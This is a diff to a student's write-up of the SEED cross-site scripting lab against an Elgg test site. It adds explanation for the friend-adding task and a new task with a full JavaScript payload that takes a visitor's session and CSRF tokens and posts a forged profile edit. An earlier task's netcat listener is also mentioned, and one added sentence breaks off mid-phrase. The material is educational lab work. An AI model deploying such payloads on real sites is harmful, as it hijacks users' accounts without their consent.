@@ -39,6 +39,7 @@ $ nc -l 5555 -v
 
 ## Task 4: Becoming the Victim’s Friend
 
+For a cross-site scripting attack, the information may not need to be sent to the attacker, but can be used directly in the attacker's script as demonstrated in this task. By using cross-site scripting in this case, the attacker (Samy) can use a script to take the user's CSRF tokens and make a request to add himself as a friend:
 
 ```html
 <script type="text/javascript">
@@ -68,3 +69,35 @@ These two lines retrieve the tokens which are used to prevent CSRF attacks. In o
 ### Question 2
 
 If the user can only use the rich text editor, they will not be able to insert malicious scripts into their profile. If we inspect the POST request, we can see that if we attempt to insert a script through the editor, characters such as the angle brackets are converted to their respective HTML entities like `&lt;` and `&gt;` for example. This prevents the HTML from parsing it as an HTML `script` tag and reading it as a regular string instead.
+
+## Task 5: Modifying the Victim’s Profile
+
+In addition to adding himself as a friend, Samy can also use cross-site scripting attack in order to modify the user's 
+
+```html
+<script type="text/javascript">
+    window.onload = function(){
+        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+        //and Security Token __elgg_token
+        let userName = elgg.session.user.name;
+        let guid = "&guid="+elgg.session.user.guid;
+        let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+        let token = "__elgg_token="+elgg.security.token.__elgg_token;
+        
+        //Construct the content of your url.
+        let sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+        let content = token + ts + "&description=Samy is my hero&accesslevel[description]=2" + guid;
+        
+        let samyGuid = 47;
+        if(elgg.session.user.guid != samyGuid) {
+            //Create and send xhr request to modify profile
+            let xhr = null;
+            xhr = new XMLHttpRequest();
+            xhr.open("POST",sendurl,true);
+            xhr.setRequestHeader("Host","www.xsslabelgg.com");
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(content);
+        }
+    }
+</script>
+```
